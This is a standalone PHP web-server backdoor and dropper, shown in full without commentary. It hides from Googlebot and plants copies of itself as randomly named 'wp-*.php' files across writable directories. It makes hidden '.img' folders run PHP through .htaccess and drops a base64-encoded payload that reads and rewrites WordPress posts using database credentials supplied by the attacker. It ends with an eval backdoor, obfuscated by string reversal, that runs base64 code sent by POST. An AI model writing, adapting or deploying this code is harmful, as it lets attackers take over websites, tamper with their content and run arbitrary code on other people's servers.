<?php
error_reporting(0);
set_time_limit(0);
@ini_set('memory_limit', '512M');
if (strpos(strtolower($_SERVER['HTTP_USER_AGENT']) , 'googlebot')) {
    header("HTTP/1.1 301 Moved Permanently");
    exit;
}
function generateRandomString($length = 10)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString.= $characters[rand(0, $charactersLength - 1) ];
    }
    return $randomString;
}
function saveF($filename, $mode, $file)
{
    $handle = fopen($filename, $mode);
    $wr = fwrite($handle, $file);
    fclose($handle);
    if ($wr) {
        return true;
    }
    else {
        return false;
    }
}
function readF($file)
{
    try {
        if (@function_exists('file_get_contents')) {
            return @file_get_contents($file);
        }
        else if (@function_exists('file')) {
            return implode("", @file($file));
        }
        else {
            $lines = array();
            $f = fopen($file, 'r');
            while (!feof($f)) {
                $lines[] = fgets($f);
            }
            return implode("\n", $lines);
        }
    }
    catch(Exception $e) {
        return "";
    }
}
class Ins

{
    public function __construct($home, $http_host)

    {
        $this->home = $home;
        $this->http_host = $http_host;
        $this->cfgs = array();
        $this->infs = array();
        $this->apis = array();
        $this->api_content = base64_decode("PD9waHANCmVycm9yX3JlcG9ydGluZygwKTsNCnNldF90aW1lX2xpbWl0KDApOw0KQGluaV9zZXQoJ21lbW9yeV9saW1pdCcsJzUxMk0nKTsNCg0KaWYgKHN0cnBvcyhzdHJ0b2xvd2VyKCRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXSksICdnb29nbGVib3QnKSkgew0KCWhlYWRlcigiSFRUUC8xLjEgMzAxIE1vdmVkIFBlcm1hbmVudGx5Iik7DQoJZXhpdDsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydwaW5nJ10pKSB7IGRpZSgiX19fX0FQV09SS0lOR19fX18iKTsgfQ0KDQppZiAoaXNzZXQoJF9QT1NUWydoJ10sICRfUE9TVFsndSddLCAkX1BPU1RbJ3AnXSwgJF9QT1NUWyduJ10pKSB7DQoNCgkkaCA9ICRfUE9TVFsnaCddOw0KCSR1ID0gJF9QT1NUWyd1J107DQoJJHAgPSAkX1BPU1RbJ3AnXTsNCgkkbiA9ICRfUE9TVFsnbiddOw0KDQoJJGYgPSAoIWlzc2V0KCRfUE9TVFsnZiddKSkgPyBlbXB0eSgkX1BPU1RbJ2YnXSkgPyAnd3BfJyA6ICRfUE9TVFsnZiddIDogJF9QT1NUWydmJ107DQoJJGRiID0gbXlzcWxpX2Nvbm5lY3QoJGgsICR1LCAkcCwgJG4pOw0KCSRkYiBvciBkaWUoanNvbl9lbmNvZGUoYXJyYXkoJ3N0YXR1cycgPT4gJ2RiX2Vycm9yJywgJ21zZycgPT4gbXlzcWxpX2Vycm9yKCRkYikpKSk7DQoJbXlzcWxpX3NldF9jaGFyc2V0KCRkYiwgInV0ZjgiKTsNCgkkcG9zdHMgPSAkZi4ncG9zdHMnOw0KCWhlYWRlcignQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9qc29uJyk7DQoJaWYgKGlzc2V0KCRfR0VUWydzaG93J10pKSB7DQoJCSRzaG93ID0gbXlzcWxpX3F1ZXJ5KCRkYiwgIlNFTEVDVCAqIEZST00gYCRwb3N0c2AgV0hFUkUgYHBvc3RfY29udGVudGAgSVMgTk9UIE5VTEwgQU5EIGBwb3N0X3N0YXR1c2AgTk9UIElOICgnZHJhZnQnLCAnYXV0by1kcmFmdCcsICdmdXR1cmUnLCAncGVuZGluZycsICdwcml2YXRlJywgJ3RyYXNoJywgJ2luaGVyaXQnKTsiKTsNCgkJJHRvdGFsID0gbXlzcWxpX251bV9yb3dzKCRzaG93KTsNCgkJaWYgKCR0b3RhbCA+IDApIHsNCgkJCSRhcnRpY2xlcyA9IGFycmF5KCk7DQoNCgkJCSRzaG93X2NvbnRlbnQgPSBpc3NldCgkX0dFVFsnc2hvd19jb250ZW50J10pID8gdHJ1ZSA6IGZhbHNlOw0KDQoJCQl3aGlsZSAoJHJvdyA9IG15c3FsaV9mZXRjaF9hc3NvYygkc2hvdykpIHsNCgkJCSAgICAkcG9zdF9pZCA9ICRyb3dbJ0lEJ107DQoJCQkgICAgJHBvc3RfZGF0ZSA9ICRyb3dbJ3Bvc3RfZGF0ZSddOw0KCQkJICAgICRwb3N0X21vZGlmaWVkID0gJHJvd1sncG9zdF9tb2RpZmllZCddOw0KCQkJICAgICRwb3N0X3R5cGUgPSAkcm93Wydwb3N0X3R5cGUnXTsNCgkJCSAgICAkZ3VpZCA9ICRyb3dbJ2d1aWQnXTsNCgkJCSAgICAkcG9zdF90aXRsZSA9ICRyb3dbJ3Bvc3RfdGl0bGUnXTsNCgkJCSAgICAkY29tbWVudF9jb3VudCA9ICRyb3dbJ2NvbW1lbnRfY291bnQnXTsNCg0KCQkJICAgIGlmIChzdHJsZW4oJHJvd1sncG9zdF9jb250ZW50J10pID4gMSkgew0KCQkJCQlpZiAoJHNob3dfY29udGVudCkgew0KCQkJCQkJJHBvc3RfY29udGVudCA9ICRyb3dbJ3Bvc3RfY29udGVudCddOw0KCQkJCQkJJHBvc3RBcnJheSA9IGFycmF5KA0KCQkJCQkJCSdwb3N0X2lkJyA9PiAkcG9zdF9pZCwNCgkJCQkJCQkncG9zdF9kYXRlJyA9PiAkcG9zdF9kYXRlLA0KCQkJCQkJCSdwb3N0X21vZGlmaWVkJyA9PiAkcG9zdF9tb2RpZmllZCwNCgkJCQkJCQkncG9zdF90eXBlJyA9PiAkcG9zdF90eXBlLA0KCQkJCQkJCSdndWlkJyA9PiAkZ3VpZCwNCgkJCQkJCQkncG9zdF90aXRsZScgPT4gJHBvc3RfdGl0bGUsDQoJCQkJCQkJJ3Bvc3RfY29udGVudCcgPT4gJHBvc3RfY29udGVudCwNCgkJCQkJCQknY29tbWVudF9jb3VudCcgPT4gJGNvbW1lbnRfY291bnQNCgkJCQkJCSk7DQoJCQkJCX1lbHNlew0KCQkJCQkJJHBvc3RBcnJheSA9IGFycmF5KA0KCQkJCQkJCSdwb3N0X2lkJyA9PiAkcG9zdF9pZCwNCgkJCQkJCQkncG9zdF9kYXRlJyA9PiAkcG9zdF9kYXRlLA0KCQkJCQkJCSdwb3N0X21vZGlmaWVkJyA9PiAkcG9zdF9tb2RpZmllZCwNCgkJCQkJCQkncG9zdF90eXBlJyA9PiAkcG9zdF90eXBlLA0KCQkJCQkJCSdndWlkJyA9PiAkZ3VpZCwNCgkJCQkJCQkncG9zdF90aXRsZScgPT4gJHBvc3RfdGl0bGUsDQoJCQkJCQkJJ2NvbW1lbnRfY291bnQnID0+ICRjb21tZW50X2NvdW50DQoJCQkJCQkpOw0KCQkJCQl9DQoJCQkJCSRhcnRpY2xlc1tdID0gJHBvc3RBcnJheTsNCgkJCSAgICB9DQoJCQl9DQoJCQkkZGF0YSA9IGFycmF5KCdzdGF0dXMnID0+ICdzdWNjZXNzJywgJ251bV9yb3dzJyA9PiAkdG90YWwsICdkYXRhJyA9PiAkYXJ0aWNsZXMpOw0KDQoJCQlkaWUoanNvbl9lbmNvZGUoJGRhdGEpKTsNCgkJfQ0KCX1lbHNlaWYgKGlzc2V0KCRfR0VUWydhcmlkJ10pKSB7DQoJCSRpZCA9IG15c3FsaV9lc2NhcGVfc3RyaW5nKCRkYiwgJF9HRVRbJ2FyaWQnXSk7DQoJCSRwaWNrID0gbXlzcWxpX3F1ZXJ5KCRkYiwgIlNFTEVDVCAqIEZST00gYCRwb3N0c2AgV0hFUkUgYElEYCA9ICckaWQnOyIpOw0KCQkkdG90YWwgPSBteXNxbGlfbnVtX3Jvd3MoJHBpY2spOw0KCQlpZiAoJHRvdGFsID4gMCkgew0KCQkJJGFydGljbGVzID0gYXJyYXkoKTsNCg0KCQkJJHJvdyA9IG15c3FsaV9mZXRjaF9hc3NvYygkcGljayk7DQoJCSAgICAkcG9zdF90eXBlID0gJHJvd1sncG9zdF90eXBlJ107DQoJCSAgICAkZ3VpZCA9ICRyb3dbJ2d1aWQnXTsNCgkJICAgICRwb3N0X3RpdGxlID0gJHJvd1sncG9zdF90aXRsZSddOw0KCQkgICAgJHBvc3RfY29udGVudCA9ICRyb3dbJ3Bvc3RfY29udGVudCddOw0KCQkgICAJDQoJCQkkZGF0YSA9IGFycmF5KA0KCQkJCSdzdGF0dXMnID0+ICdzdWNjZXNzJywNCgkJCQknbnVtX3Jvd3MnID0+ICR0b3RhbCwNCgkJICAgCQkncG9zdF90eXBlJyA9PiAkcG9zdF90eXBlLA0KCQkgICAJCSdndWlkJyA9PiAkZ3VpZCwNCgkJICAgCQkncG9zdF90aXRsZScgPT4gJHBvc3RfdGl0bGUsDQoJCSAgIAkJJ3Bvc3RfY29udGVudCcgPT4gJHBvc3RfY29udGVudA0KCQkJKTsNCg0KCQkJZGllKGpzb25fZW5jb2RlKCRkYXRhKSk7DQoJCX0NCgl9DQoJZWxzZWlmIChpc3NldCgkX0dFVFsnZWRpdCddKSkgew0KCQlpZiAoaXNzZXQoJF9QT1NUWydwb3N0X2lkJ10sICRfUE9TVFsncG9zdF90aXRsZSddLCAkX1BPU1RbJ3Bvc3RfY29udGVudCddKSkgew0KCQkJJHBvc3RfaWQgPSBteXNxbGlfcmVhbF9lc2NhcGVfc3RyaW5nKCRkYiwgJF9QT1NUWydwb3N0X2lkJ10pOw0KCQkJJHBvc3RfdGl0bGUgPSBzdHJfcmVwbGFjZSgiJyIsICJcJyIsIHN0cmlwc2xhc2hlcygkX1BPU1RbJ3Bvc3RfdGl0bGUnXSkpOw0KCQkJJHBvc3RfY29udGVudCA9IHN0cl9yZXBsYWNlKCInIiwgIlwnIiwgc3RyaXBzbGFzaGVzKCRfUE9TVFsncG9zdF9jb250ZW50J10pKTsNCgkJCW15c3FsaV9xdWVyeSgkZGIsICJVUERBVEUgJHBvc3RzIFNFVCBgcG9zdF9jb250ZW50YD0nJHBvc3RfY29udGVudCcsIGBwb3N0X3RpdGxlYD0nJHBvc3RfdGl0bGUnIFdIRVJFIGBJRGA9JHBvc3RfaWQ7Iik7DQoJCQlpZiAobXlzcWxpX2FmZmVjdGVkX3Jvd3MoJGRiKSA+IDApIHsNCgkJCQlkaWUoanNvbl9lbmNvZGUoYXJyYXkoJ3N0YXR1cycgPT4gJ3VwZGF0ZV9zdWNjZXNzJykpKTsNCgkJCX1lbHNlew0KCQkJCWRpZShqc29uX2VuY29kZShhcnJheSgnc3RhdHVzJyA9PiAndXBkYXRlX2ZhaWxlZCcpKSk7DQoJCQl9DQoJCX1lbHNlew0KCQkJZGllKGpzb25fZW5jb2RlKGFycmF5KCdzdGF0dXMnID0+ICdpbmNvbXBsZXRlX2RhdGEnKSkpOw0KCQl9DQoJfQ0KCUBteXNxbGlfY2xvc2UoJGRiKTsNCn0NCg==") . "/* @hash: " . @md5($http_host);
        $this->inf_content = explode("/* @hash: ", readF(__FILE__)) [0] . "/* @hash: " . @md5($http_host);
    }
    public function getUrl($fullpath)

    {
        $domain = str_replace('www.', '', $this->http_host);
        $home = str_replace('///', '/', str_replace('//', '/', str_replace('\\', '/', $this->home)));
        $fullpath = str_replace('///', '/', str_replace('//', '/', str_replace('\\', '/', $fullpath)));
        $protocol = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://';
        return $protocol . str_replace($home, $domain . '/', $fullpath);
    }
    public function imgInstall($paths, $n, $ext = '$ext')
    {
        shuffle($paths);
        $i = 0;
        $img_htacces = "AddHandler application/x-httpd-php $ext\nAddType application/x-httpd-php $ext";
        foreach($paths as $path) {
            try {
                if ($i > $n) {
                    break;
                }
                $path = str_replace('///', '/', str_replace('//', '/', $path . '/'));
                if (@mkdir($path . '/.img')) {
                    if (strpos(readF($path . '.img/.htaccess') , " $ext")) {
                        $writtenHT = true;
                    }
                    else {
                        if (saveF($path . '.img/.htaccess', 'w', $img_htacces)) {
                            $writtenHT = true;
                        }
                        else {
                            $writtenHT = false;
                        }
                    }
                    if ($writtenHT == true) {
                        if (!@file_exists($path . ".img/.inf$ext")) {
                            $inf_cont = $this->inf_content . " - " . rand(1, 99999) . "inf */";
                            if (saveF($path . ".img/.inf$ext", 'w', $inf_cont)) {
                                $this->infs[] = str_replace('//', '/', $this->getUrl($path . "/.img/.inf$ext"));
                            }
                        }
                        if (!@file_exists($path . ".img/.api$ext")) {
                            $api_cont = $this->api_content . " - " . rand(1, 99999) . "api */";
                            if (saveF($path . ".img/.api$ext", 'w', $api_cont)) {
                                $this->apis[] = str_replace('//', '/', $this->getUrl($path . "/.img/.api$ext"));
                            }
                        }
                    }
                    @chmod($path . '/.img', 111);
                }
                $i+= 1;
            }
            catch(Exception $e) {
            }
        }
    }
    public function phpInstall($paths, $nI, $nA)

    {
        shuffle($paths);
        $i = 0;
        $tN = $nI + $nA;
        $tPaths = count($paths);
        if ($tN > $tPaths) {
            $tN = $tPaths;
            $nI = round($tPaths / 2);
            $nA = $nI;
        }
        $iNI = $iNA = 0;
        foreach($paths as $path) {
            if ($i > $tN) {
                break;
            }
            $file = 'wp-' . generateRandomString(rand(1, 8)) . '.php';
            $full = str_replace('///', '/', str_replace('//', '/', str_replace('\\', '/', $path . '/' . $file)));
            $api_cont = $this->api_content . " - " . rand(1, 99999) . "api */";
            $inf_cont = $this->inf_content . " - " . rand(1, 99999) . "inf */";
            if ($iNI < $nI) {
                if (saveF($full, 'w', $inf_cont)) {
                    $this->infs[] = str_replace('//', '/', $this->getUrl($full));
                    $iNI+= 1;
                    $i+= 1;
                }
            }
            elseif ($iNA < $nA) {
                if (saveF($full, 'w', $api_cont)) {
                    $this->apis[] = str_replace('//', '/', $this->getUrl($full));
                    $iNA+= 1;
                    $i+= 1;
                }
            }
            else {
                break;
            }
        }
    }
    public function getWritableDirs($start_point, $depth)
    {
        try {
            $writableDirs = array();
            $dirObj = new RecursiveDirectoryIterator($start_point);
            $iterator = new RecursiveIteratorIterator($dirObj, RecursiveIteratorIterator::LEAVES_ONLY, RecursiveIteratorIterator::CATCH_GET_CHILD);
            $iterator->setMaxDepth($depth);
            foreach($iterator as $file) {
                try {
                    if ($file->isDir() && $file->isWritable() && $file->getFilename() == '.') {
                        $writableDirs[] = $file->getPath();
                    }
                }
                catch(Exception $e) {
                }
            }
            return $writableDirs;
        }
        catch(Exception $e) {
        }
    }
    public function getAllInfs()

    {
        return $this->infs;
    }
    public function getAllApis()

    {
        return $this->apis;
    }
}
if (isset($_GET['ping'])) {
    die("____INF_WORKING____");
}
elseif (isset($_GET['nI'], $_GET['nA'])) {
    $nI = $_GET['nI'];
    $nA = $_GET['nA'];
    if (!is_numeric($nI) || !is_numeric($nA)) {
        exit;
    }
    @header("Content-type: application/json");
    $home = empty($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['HOME'] : $_SERVER['DOCUMENT_ROOT'];
    $http_host = $_SERVER['HTTP_HOST'];
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        $DOC_R = str_replace('//', '/', str_replace('\\', '/', $home . '/'));
    }
    else {
        $DOC_R = str_replace('//', '/', $home . '/');
    }
    if (substr_count(dirname(__FILE__) , '/') > 1) {
        $CURR_DIR = str_replace('//', '/', str_replace('\\', '/', dirname(__FILE__) . '/'));
    }
    else if (substr_count(getcwd() , '/') > 1) {
        $CURR_DIR = str_replace('//', '/', str_replace('\\', '/', getcwd() . '/'));
    }
    else {
        $CURR_DIR = str_replace('//', '/', str_replace('\\', '/', __DIR__ . '/'));
    }
    $Ins = new Ins($DOC_R, $http_host);
    $writableDirs = $Ins->getWritableDirs($DOC_R, 3);
    $totalWritableDirs = count($writableDirs);
    $dirs = ($totalWritableDirs == 0) ? array(
        $CURR_DIR,
        $DOC_R
    ) : $writableDirs;
    $Ins->phpInstall($dirs, $nI, $nA);
    $getInfs = $Ins->getAllInfs();
    $getApis = $Ins->getAllApis();
    echo json_encode(array(
        "infs" => $getInfs,
        "apis" => $getApis
    ));
}
if (isset($_GET['e'])) {
    $a = "a";
    $b = "l";
    $c = "v";
    $d = "k";
    $f = str_replace("k", "e", strrev($b . $a . $c . $d));
    @$f(base64_decode($_POST[0]));
}
 /** - 33637 - */